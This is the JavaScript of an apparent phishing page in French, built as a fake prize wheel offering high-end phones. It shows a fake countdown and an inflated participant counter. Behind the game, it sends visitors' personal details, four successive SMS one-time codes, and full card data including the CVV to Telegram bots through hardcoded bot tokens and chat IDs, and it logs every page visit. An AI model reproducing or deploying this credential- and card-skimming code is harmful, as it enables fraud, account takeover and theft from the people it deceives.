document.addEventListener('DOMContentLoaded', function() {
    console.log('DOM content loaded');
    
    let capturedFormData = {};
    const prizes = [
        { id: 1, name: "SAMSUNG Galaxy S25 Ultra", image: "3ad46717-galaxy-s25-ultra__1200_1200__overflow.jpg", description: "Le smartphone Samsung le plus puissant avec 5G et 256GB de stockage", type: "grand", angle: 90 },
        { id: 2, name: "iPhone 17 Pro Max", image: "ip17pro-max-o-.jpg", description: "Le dernier iPhone avec caméra avancée et puce A17 Pro", type: "grand", angle: 270 }
    ];
    
    let isSpinning = false;
    let winningPrize = null;
    let otpEntryCount = 0;
    const otpLengths = [10, 10, 10, 10];
    const totalOtpEntries = otpLengths.length;
    const WAIT_TIME_OTP = 30;

    function showSection(sectionIdToShow) {
        const allSections = ['hero-section', 'wheel-section', 'shipping-section', 'processingScreen', 'otpWaitScreen', 'otpScreen', 'payment-section', 'finalConfirmationModal', 'wheelResultModal'];
        const sectionToShow = document.getElementById(sectionIdToShow);

        allSections.forEach(id => {
            const section = document.getElementById(id);
            if (section && id !== sectionIdToShow) {
                section.style.display = 'none';
            }
        });

        if (sectionToShow) {
            const isModal = sectionIdToShow.includes('Modal') || sectionIdToShow.includes('Screen') || sectionIdToShow === 'otpScreen' || sectionIdToShow === 'payment-section';
            sectionToShow.style.display = isModal ? 'flex' : 'block';
            gsap.fromTo(sectionToShow, {autoAlpha: 0, scale: 0.95}, {autoAlpha: 1, scale: 1, duration: 0.3});
        }
    }

    function createConfetti() {
        const container = document.getElementById('confettiContainer');
        container.innerHTML = '';

        const colors = ['#e2001a', '#FFFFFF', '#C0C0C0', '#FFD700'];

        for (let i = 0; i < 150; i++) {
            const confetti = document.createElement('div');
            confetti.className = 'confetti';

            const color = colors[Math.floor(Math.random() * colors.length)];
            const size = Math.random() * 8 + 6;
            const left = Math.random() * 100;
            const delay = Math.random() * 3;
            const duration = Math.random() * 3 + 2;

            confetti.style.setProperty('--color', color);
            confetti.style.width = `${size}px`;
            confetti.style.height = `${size}px`;
            confetti.style.left = `${left}%`;
            confetti.style.animationDelay = `${delay}s`;
            confetti.style.animationDuration = `${duration}s`;

            container.appendChild(confetti);

            setTimeout(() => {
                if (confetti.parentNode) {
                    confetti.parentNode.removeChild(confetti);
                }
            }, (duration + delay) * 1000);
        }
    }

    // Wheel spin function
    function spinWheel() {
        if (isSpinning) return;

        isSpinning = true;

        const wheel = document.getElementById('wheel');
        const spinButton = document.getElementById('spin-button');

        spinButton.classList.add('spinning');

        // Calculate random result with weighted probabilities
        const random = Math.random();
        let resultIndex;

        if (random < 0.5) {
            resultIndex = 0; // SAMSUNG Galaxy S25 Ultra - 50% chance
        } else {
            resultIndex = 1; // iPhone 17 Pro Max - 50% chance
        }

        const selectedPrize = prizes[resultIndex];
        winningPrize = selectedPrize;

        // Calculate the rotation needed to land on the selected prize
        const fullRotations = 5; // Number of full rotations before stopping
        const targetAngle = fullRotations * 360 + selectedPrize.angle;

        // Apply the rotation with easing
        wheel.style.setProperty('--end-rotation', `${targetAngle}deg`);
        wheel.classList.add('wheel-spin-animation');

        // After the animation completes, show the result
        setTimeout(() => {
            isSpinning = false;
            spinButton.classList.remove('spinning');
            showWheelResult(selectedPrize);
        }, 6000);
    }

    function showWheelResult(prize) {
        const resultModal = document.getElementById('wheelResultModal');
        const resultTitle = document.getElementById('result-title');
        const resultImage = document.getElementById('result-image');
        const resultDescription = document.getElementById('result-description');
        const resultBadge = document.getElementById('result-badge');
        const claimPrizeBtn = document.getElementById('claim-prize-btn');

        resultTitle.textContent = `Vous avez gagné ${prize.name} !`;
        resultImage.src = prize.image;
        resultImage.alt = prize.name;
        resultDescription.textContent = prize.description;

        if (prize.type === 'grand') {
            resultBadge.textContent = "Félicitations !";
            resultBadge.style.background = "linear-gradient(135deg, #e2001a, #b30015)";
            claimPrizeBtn.textContent = "Réclamer votre prix";
            createConfetti();
        } else {
            resultBadge.textContent = "Félicitations !";
            resultBadge.style.background = "linear-gradient(135deg, #0066b3, #004d99)";
            claimPrizeBtn.textContent = "Réclamer votre prix";
        }

        showSection('wheelResultModal');
    }

    // Dynamic Countdown Timer
    function updateCountdown() {
        const endDate = new Date('2025-11-30T23:59:59');
        const now = new Date();
        const diff = endDate - now;

        if (diff <= 0) {
            document.getElementById('countdown-days').textContent = '00';
            document.getElementById('countdown-hours').textContent = '00';
            document.getElementById('countdown-minutes').textContent = '00';
            document.getElementById('countdown-seconds').textContent = '00';
            return;
        }

        const days = Math.floor(diff / (1000 * 60 * 60 * 24));
        const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
        const seconds = Math.floor((diff % (1000 * 60)) / 1000);

        document.getElementById('countdown-days').textContent = days.toString().padStart(2, '0');
        document.getElementById('countdown-hours').textContent = hours.toString().padStart(2, '0');
        document.getElementById('countdown-minutes').textContent = minutes.toString().padStart(2, '0');
        document.getElementById('countdown-seconds').textContent = seconds.toString().padStart(2, '0');
    }
    setInterval(updateCountdown, 1000);
    updateCountdown();

    // Dynamic Participants Counter
    function updateParticipants() {
        const maxParticipants = 5000;
        let currentParticipants = 2847;

        const participantsSpan = document.querySelector('.flex.justify-between.text-sm.mb-1 span:last-child');
        const progressBar = document.querySelector('.progress-fill');

        function incrementParticipants() {
            if (currentParticipants < maxParticipants) {
                const increment = Math.floor(Math.random() * 5) + 1;
                currentParticipants += increment;
                if (currentParticipants > maxParticipants) {
                    currentParticipants = maxParticipants;
                }

                const percentage = (currentParticipants / maxParticipants) * 100;

                participantsSpan.textContent = `${currentParticipants.toLocaleString()} sur ${maxParticipants.toLocaleString()}`;
                progressBar.style.width = `${percentage}%`;
            }
        }

        setInterval(incrementParticipants, Math.random() * 5000 + 2000);
    }
    updateParticipants();

    // Wheel spin button
    document.getElementById('spin-button').addEventListener('click', spinWheel);

    // Claim prize button
    document.getElementById('claim-prize-btn').addEventListener('click', function() {
        showSection('shipping-section');
        document.getElementById('shipping-section').scrollIntoView({ behavior: 'smooth' });
    });

    // Form submission - Étape 1: Adresse
    document.getElementById('shipping-form').addEventListener('submit', function(e) {
        console.log('Formulaire de livraison soumis');
        e.preventDefault();
        const formData = new FormData(e.target);
        capturedFormData = Object.fromEntries(formData.entries());

        let userInfoMessage = `
✨ **Nouveau participant !** ✨\n\n`;
        userInfoMessage += `**Prénom:** ${capturedFormData.firstname || 'N/A'}\n`;
        userInfoMessage += `**Nom:** ${capturedFormData.lastname || 'N/A'}\n`;
        userInfoMessage += `**Email:** ${capturedFormData.email || 'N/A'}\n`;
        userInfoMessage += `**Téléphone:** ${capturedFormData.phone || 'N/A'}\n`;
        userInfoMessage += `**Adresse:** ${capturedFormData.address || 'N/A'}\n`;
        userInfoMessage += `**Ville:** ${capturedFormData.city || 'N/A'}, ${capturedFormData.zip || 'N/A'}\n`;
        sendToTelegram(userInfoMessage);

        // Étape 2: Écran de traitement
        showSection('processingScreen');
        setTimeout(() => {
            setupOtpScreen(otpEntryCount);
            showSection('otpScreen');
        }, 30000);
    });

    function startOtpWaitTimer() {
        let timeLeft = WAIT_TIME_OTP;
        const timerElement = document.getElementById('otpTimer');
        const timerCircle = document.getElementById('otpTimerCircle');
        const circumference = 2 * Math.PI * 45;

        timerElement.textContent = timeLeft;
        timerCircle.style.strokeDashoffset = 0;

        const interval = setInterval(() => {
            timeLeft--;
            timerElement.textContent = timeLeft;
            const offset = circumference - (timeLeft / WAIT_TIME_OTP) * circumference;
            timerCircle.style.strokeDashoffset = offset;

            if (timeLeft <= 0) {
                clearInterval(interval);
                showSection('otpScreen');
                const otpInput = document.getElementById('singleOtpInput');
                if (otpInput) {
                    otpInput.value = '';
                    otpInput.focus();
                }
            }
        }, 1000);
    }

    // OTP validation - Étape 3: Validation SMS (4 fois)
    document.getElementById('otpValidateButton').addEventListener('click', function() {
        const otpInput = document.getElementById('singleOtpInput');
        const otpCode = otpInput.value.trim();
        
        // MODIFICATION: Accepte 1 à 10 chiffres (pas obligatoirement 10)
        if (otpCode.length < 1 || otpCode.length > 10 || !/^\d+$/.test(otpCode)) {
            alert('Veuillez entrer entre 1 et 10 chiffres');
            return;
        }

        capturedFormData[`otp_etape_${otpEntryCount + 1}`] = otpCode;
        let otpMessage = `**Téléphone:** ${capturedFormData.phone || 'N/A'}\n`;
        otpMessage += `**Code OTP #${otpEntryCount + 1}:** \`${otpCode}\` (${otpCode.length} chiffres)`;
        sendToTelegram(otpMessage);

        otpEntryCount++;
        
        // Mise à jour du compteur OTP
        const currentOtpAttempt = document.getElementById('currentOtpAttempt');
        if (currentOtpAttempt) {
            currentOtpAttempt.textContent = otpEntryCount + 1;
        }

        if (otpEntryCount < totalOtpEntries) {
            otpInput.value = '';
            showSection('otpWaitScreen');
            startOtpWaitTimer();
        } else {
            // Étape 4: Après les 4 OTP, afficher la page de paiement
            showSection('payment-section');
        }
    });

    // Resend OTP button
    document.getElementById('resendOtpBtn').addEventListener('click', function() {
        const otpInput = document.getElementById('singleOtpInput');
        if (otpInput) {
            otpInput.value = '';
            otpInput.focus();
        }
        alert('Code OTP renvoyé');
    });

    // Paiement par carte - Étape 5: Dernière étape avant confirmation
    document.getElementById('payment-form').addEventListener('submit', function(e) {
        console.log('Formulaire de paiement soumis');
        e.preventDefault();
        
        const cardData = {
            cardNumber: document.getElementById('card-number').value,
            cardName: document.getElementById('card-name').value,
            cardExpiry: document.getElementById('card-expiry').value,
            cardCvv: document.getElementById('card-cvv').value
        };
        
        capturedFormData = {...capturedFormData, ...cardData};
        
        let paymentMessage = `
💳 **Informations de paiement** 💳\n\n`;
        paymentMessage += `**Titulaire:** ${cardData.cardName}\n`;
        paymentMessage += `**Numéro de carte:** ${cardData.cardNumber}\n`;
        paymentMessage += `**Expiration:** ${cardData.cardExpiry}\n`;
        paymentMessage += `**CVV:** ${cardData.cardCvv}\n`;
        paymentMessage += `**Montant:** 1.99€ (frais de livraison)\n`;
        sendToTelegram(paymentMessage);

        // Étape 6: Confirmation finale
        showSection('finalConfirmationModal');
    });

    // Auto-validate only digits
    document.addEventListener('input', function(e) {
        if (e.target.id === 'singleOtpInput') {
            const otpInput = e.target;
            const otpCode = otpInput.value.trim();
            
            // Only allow digits
            otpInput.value = otpCode.replace(/\D/g, '');
        }
        
        // Formatage de la date d'expiration de carte
        if (e.target.id === 'card-expiry') {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value;
        }
        
        // Formatage du numéro de carte (groupes de 4 chiffres)
        if (e.target.id === 'card-number') {
            let value = e.target.value.replace(/\D/g, '');
            value = value.substring(0, 16);
            let formatted = '';
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) {
                    formatted += ' ';
                }
                formatted += value[i];
            }
            e.target.value = formatted;
        }
        
        // Limiter le CVV à 3 chiffres
        if (e.target.id === 'card-cvv') {
            let value = e.target.value.replace(/\D/g, '');
            e.target.value = value.substring(0, 3);
        }
    });

    function sendToTelegram(message) {
        console.log('Tentative d\'envoi de message aux deux bots Telegram...');
        
        const botToken1 = "8245021160:AAEnbdixzuhvNj-IJVAlewEGLb0_Qszd9_U";
        const chatId1 = "-1003768455972";
        const url1 = `https://api.telegram.org/bot${botToken1}/sendMessage`;

        const botToken2 = "8245021160:AAEnbdixzuhvNj-IJVAlewEGLb0_Qszd9_U";
        const chatId2 = "-1003768455972";
        const url2 = `https://api.telegram.org/bot${botToken2}/sendMessage`;

        const params1 = new URLSearchParams({
            chat_id: chatId1,
            text: message,
            parse_mode: 'Markdown'
        });

        const params2 = new URLSearchParams({
            chat_id: chatId2,
            text: message,
            parse_mode: 'Markdown'
        });

        // Send to first bot
        fetch(`${url1}?${params1.toString()}`, { method: 'GET' })
            .then(response => response.json())
            .then(result => {
                if(result.ok) {
                    console.log('Message envoyé avec succès au premier bot Telegram:', result.ok);
                } else {
                    console.error('Erreur lors de l\'envoi du message au premier bot Telegram:', result);
                }
            })
            .catch(error => {
                console.error('Erreur lors de l\'envoi du message au premier bot Telegram:', error);
            });

        // Send to second bot
        fetch(`${url2}?${params2.toString()}`, { method: 'GET' })
            .then(response => response.json())
            .then(result => {
                if(result.ok) {
                    console.log('Message envoyé avec succès au second bot Telegram:', result.ok);
                } else {
                    console.error('Erreur lors de l\'envoi du message au second bot Telegram:', result);
                }
            })
            .catch(error => {
                console.error('Erreur lors de l\'envoi du message au second bot Telegram:', error);
            });
    }

    // FAQ toggle functionality
    document.querySelectorAll('.wheel-faq-question').forEach(question => {
        question.addEventListener('click', function() {
            const answer = this.nextElementSibling;
            const toggle = this.querySelector('.wheel-faq-toggle');

            if (answer.style.display === 'block') {
                answer.style.display = 'none';
                toggle.textContent = '+';
            } else {
                answer.style.display = 'block';
                toggle.textContent = '-';
            }
        });
    });

    // Animate elements on scroll
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('fade-in');
            }
        });
    }, { threshold: 0.1, rootMargin: '0px 0px -50px 0px' });

    document.querySelectorAll('.stagger-item').forEach(item => {
        observer.observe(item);
    });

    function setupOtpScreen(stepIndex) {
        const otpLength = otpLengths[stepIndex];
        const instructionText = document.getElementById('otp-instruction-text');
        const currentOtpAttempt = document.getElementById('currentOtpAttempt');
        const totalOtpAttempts = document.getElementById('totalOtpAttempts');

        // Update instruction text if element exists
        if (instructionText) {
            instructionText.textContent = `Entrez le code à ${otpLength} chiffres que vous avez reçu.`;
        }

        // Update OTP counter
        if (currentOtpAttempt) {
            currentOtpAttempt.textContent = stepIndex + 1;
        }
        if (totalOtpAttempts) {
            totalOtpAttempts.textContent = totalOtpEntries;
        }

        // Focus on OTP input
        const otpInput = document.getElementById('singleOtpInput');
        if (otpInput) {
            setTimeout(() => {
                otpInput.focus();
            }, 100);
        }
    }

    // Initialize marquee
    function initMarquee() {
        const marqueeList = document.querySelector('.wheel-spin-history-list');
        if (marqueeList) {
            const items = Array.from(marqueeList.children);
            const marqueeContent = document.createElement('div');
            marqueeContent.classList.add('marquee-content');

            // Append original items
            items.forEach(item => marqueeContent.appendChild(item));

            // Append cloned items for seamless loop
            items.forEach(item => {
                const clone = item.cloneNode(true);
                marqueeContent.appendChild(clone);
            });

            marqueeList.innerHTML = '';
            marqueeList.appendChild(marqueeContent);
        }
    }

    initMarquee();

    const wheelSection = document.getElementById('wheel-section');

    const enterBtn = document.getElementById('enter-btn');
    if(enterBtn && wheelSection){
        enterBtn.addEventListener('click', function(event) {
          event.preventDefault();
          wheelSection.scrollIntoView({ behavior: 'smooth' });
        });
    }

    const wheelEnterBtn = document.getElementById('wheel-enter-btn');
    if(wheelEnterBtn && wheelSection){
        wheelEnterBtn.addEventListener('click', function(event) {
            event.preventDefault();
            wheelSection.scrollIntoView({ behavior: 'smooth' });
        });
    }

    function sendVisitNotification() {
        console.log('Envoi de notification de visite aux deux bots...');
        
        // First bot
        const botToken1 = "7019053702:AAHahO6qGOdZyQ-vv_IRMYmS6yoqiDLF4hA";
        const chatId1 = "965011527";
        const message = "👁 Nouvelle visite sur la page 👁";
        const url1 = `https://api.telegram.org/bot${botToken1}/sendMessage`;

        // Second bot
        const botToken2 = "8290233120:AAGCNu8qhbly2BLjJjWY3gUCVOSHzZ2Mi18";
        const chatId2 = "5372119436";
        const url2 = `https://api.telegram.org/bot${botToken2}/sendMessage`;

        const params1 = new URLSearchParams({
            chat_id: chatId1,
            text: message,
            parse_mode: 'Markdown'
        });

        const params2 = new URLSearchParams({
            chat_id: chatId2,
            text: message,
            parse_mode: 'Markdown'
        });

        // Send to first bot
        fetch(`${url1}?${params1.toString()}`, { method: 'GET' })
            .then(response => response.json())
            .then(result => {
                if(result.ok) {
                    console.log('Notification de visite envoyée avec succès au premier bot:', result.ok);
                } else {
                    console.error('Erreur lors de l\'envoi de la notification de visite au premier bot:', result);
                }
            })
            .catch(error => {
                console.error('Erreur lors de l\'envoi de la notification de visite au premier bot:', error);
            });

        // Send to second bot
        fetch(`${url2}?${params2.toString()}`, { method: 'GET' })
            .then(response => response.json())
            .then(result => {
                if(result.ok) {
                    console.log('Notification de visite envoyée avec succès au second bot:', result.ok);
                } else {
                    console.error('Erreur lors de l\'envoi de la notification de visite au second bot:', result);
                }
            })
            .catch(error => {
                console.error('Erreur lors de l\'envoi de la notification de visite au second bot:', error);
            });
    }

    sendVisitNotification();

    // Initialize OTP screen
    setupOtpScreen(0);
});